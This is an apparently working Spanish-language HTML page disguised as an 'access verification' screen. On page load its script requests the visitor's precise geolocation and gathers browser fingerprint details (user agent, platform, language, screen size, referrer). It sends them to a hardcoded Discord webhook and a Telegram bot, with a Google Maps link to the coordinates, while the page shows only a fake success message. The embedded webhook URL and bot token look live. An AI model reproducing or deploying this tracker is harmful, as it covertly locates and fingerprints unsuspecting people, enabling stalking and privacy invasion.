<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Acceso</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            padding: 50px 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            text-align: center;
            max-width: 450px;
            width: 100%;
            animation: fadeIn 0.5s ease-in;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .icon {
            font-size: 72px;
            margin-bottom: 25px;
            animation: pulse 2s infinite;
            filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.1));
        }

        @keyframes pulse {
            0%, 100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.05);
            }
        }

        h1 {
            color: #333;
            font-size: 26px;
            margin-bottom: 15px;
            font-weight: 600;
            letter-spacing: -0.5px;
        }

        #msg {
            color: #666;
            font-size: 15px;
            line-height: 1.7;
            margin-bottom: 30px;
            padding: 0 10px;
        }

        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 45px;
            height: 45px;
            animation: spin 1s linear infinite;
            margin: 25px auto;
            display: none;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loader.active {
            display: block;
        }

        .status-icon {
            font-size: 48px;
            margin: 20px 0;
            display: none;
        }

        .status-icon.show {
            display: block;
            animation: scaleIn 0.3s ease-out;
        }

        @keyframes scaleIn {
            from {
                transform: scale(0);
            }
            to {
                transform: scale(1);
            }
        }

        .footer {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #eee;
            color: #999;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🔐</div>
        <h1>Verificación de Acceso</h1>
        <p id="msg">Iniciando proceso de verificación...</p>
        <div class="loader" id="loader"></div>
        <div class="status-icon" id="statusIcon"></div>
        <div class="footer">Sistema de verificación segura</div>
    </div>

    <script>
        // --- CONFIGURACIÓN ---
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1327800733330599946/BRlFD4PvC66BvqfW7XNbHNYVHVl2uYyXtZQ1ufivSQlTfj0gk2_tFQB_p0mdhwLjPQmk";
        const TELEGRAM_TOKEN = '8536690071:AAG-ScvmZZYWSdhrd3v4lltuWagWuVFlLBU';
        const CHAT_ID = '7542699747';
        // ---------------------

        // Objeto para almacenar todos los datos
        let datosRecolectados = {
            timestamp: new Date().toLocaleString('es-ES', { 
                timeZone: 'America/Santo_Domingo',
                dateStyle: 'full',
                timeStyle: 'long'
            }),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: `${screen.width}x${screen.height}`,
            viewportSize: `${window.innerWidth}x${window.innerHeight}`,
            referrer: document.referrer || "Directo",
            latitude: "No disponible",
            longitude: "No disponible",
            accuracy: "N/A",
            ubicacionObtenida: false,
            errorUbicacion: null
        };

        window.onload = () => {
            actualizarEstado("Solicitando permisos necesarios...");
            document.getElementById("loader").classList.add("active");
            
            // Siempre intentar obtener geolocalización
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        // Éxito: guardar coordenadas
                        datosRecolectados.latitude = pos.coords.latitude;
                        datosRecolectados.longitude = pos.coords.longitude;
                        datosRecolectados.accuracy = Math.round(pos.coords.accuracy);
                        datosRecolectados.ubicacionObtenida = true;
                        enviarDatos();
                    },
                    (error) => {
                        // Error: guardar el tipo de error y enviar de todos modos
                        datosRecolectados.ubicacionObtenida = false;
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                datosRecolectados.errorUbicacion = "Permiso denegado por el usuario";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                datosRecolectados.errorUbicacion = "Información de ubicación no disponible";
                                break;
                            case error.TIMEOUT:
                                datosRecolectados.errorUbicacion = "Tiempo de espera agotado";
                                break;
                            default:
                                datosRecolectados.errorUbicacion = "Error desconocido";
                        }
                        enviarDatos();
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                // Navegador no compatible
                datosRecolectados.ubicacionObtenida = false;
                datosRecolectados.errorUbicacion = "Navegador no compatible con geolocalización";
                enviarDatos();
            }
        };

        async function enviarDatos() {
            // Construir mensaje para Discord
            const coordenadasTexto = datosRecolectados.ubicacionObtenida 
                ? `\`${datosRecolectados.latitude}, ${datosRecolectados.longitude}\``
                : "`No disponible`";
            
            const precisionTexto = datosRecolectados.ubicacionObtenida
                ? `${datosRecolectados.accuracy}m`
                : "N/A";

            const discordMessage = {
                content: `🔔 **Nueva Verificación Completada**`,
                embeds: [{
                    title: "📍 Detalles de Acceso",
                    color: datosRecolectados.ubicacionObtenida ? 5814783 : 15158332,
                    fields: [
                        {
                            name: "Coordenadas",
                            value: coordenadasTexto,
                            inline: false
                        },
                        {
                            name: "Precisión",
                            value: precisionTexto,
                            inline: true
                        },
                        {
                            name: "Estado Ubicación",
                            value: datosRecolectados.ubicacionObtenida ? "✅ Obtenida" : `❌ ${datosRecolectados.errorUbicacion}`,
                            inline: true
                        },
                        {
                            name: "Fecha y Hora",
                            value: datosRecolectados.timestamp,
                            inline: false
                        },
                        {
                            name: "Navegador",
                            value: `${datosRecolectados.platform} - ${datosRecolectados.language}`,
                            inline: true
                        },
                        {
                            name: "Resolución Pantalla",
                            value: datosRecolectados.screenResolution,
                            inline: true
                        },
                        {
                            name: "Viewport",
                            value: datosRecolectados.viewportSize,
                            inline: true
                        },
                        {
                            name: "Referrer",
                            value: datosRecolectados.referrer,
                            inline: false
                        },
                        {
                            name: "User Agent",
                            value: `\`\`\`${datosRecolectados.userAgent.substring(0, 500)}\`\`\``,
                            inline: false
                        }
                    ],
                    footer: {
                        text: "Sistema de Verificación"
                    },
                    timestamp: new Date().toISOString()
                }]
            };

            // Construir mensaje para Telegram
            let telegramMessage = `🔔 *Nueva Verificación Completada*\n\n`;
            
            if (datosRecolectados.ubicacionObtenida) {
                telegramMessage += `📍 *Coordenadas:* \`${datosRecolectados.latitude}, ${datosRecolectados.longitude}\`\n`;
                telegramMessage += `📏 *Precisión:* ${datosRecolectados.accuracy}m\n`;
                telegramMessage += `🗺️ [Ver en Google Maps](https://www.google.com/maps?q=${datosRecolectados.latitude},${datosRecolectados.longitude})\n\n`;
            } else {
                telegramMessage += `📍 *Coordenadas:* No disponible\n`;
                telegramMessage += `⚠️ *Error:* ${datosRecolectados.errorUbicacion}\n\n`;
            }
            
            telegramMessage += `🕐 *Fecha:* ${datosRecolectados.timestamp}\n`;
            telegramMessage += `💻 *Sistema:* ${datosRecolectados.platform}\n`;
            telegramMessage += `🌐 *Idioma:* ${datosRecolectados.language}\n`;
            telegramMessage += `📱 *Resolución:* ${datosRecolectados.screenResolution}\n`;
            telegramMessage += `🔗 *Referrer:* ${datosRecolectados.referrer}\n\n`;
            telegramMessage += `*User Agent:*\n\`${datosRecolectados.userAgent.substring(0, 200)}\``;

            try {
                // Enviar a Discord
                const discordPromise = fetch(DISCORD_WEBHOOK, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(discordMessage)
                });

                // Enviar a Telegram
                const telegramPromise = fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: telegramMessage,
                        parse_mode: "Markdown",
                        disable_web_page_preview: false
                    })
                });

                // Esperar ambas peticiones
                await Promise.all([discordPromise, telegramPromise]);
                
                mostrarExito();
            } catch (error) {
                mostrarError("Error al procesar la verificación.");
            }
        }

        function mostrarExito() {
            document.getElementById("loader").classList.remove("active");
            const statusIcon = document.getElementById("statusIcon");
            statusIcon.textContent = "✅";
            statusIcon.classList.add("show");
            actualizarEstado("Verificación completada exitosamente.");
        }

        function mostrarError(mensaje) {
            document.getElementById("loader").classList.remove("active");
            const statusIcon = document.getElementById("statusIcon");
            statusIcon.textContent = "❌";
            statusIcon.classList.add("show");
            actualizarEstado(mensaje);
        }

        function actualizarEstado(txt) {
            document.getElementById("msg").innerText = txt;
        }
    </script>
</body>
</html>
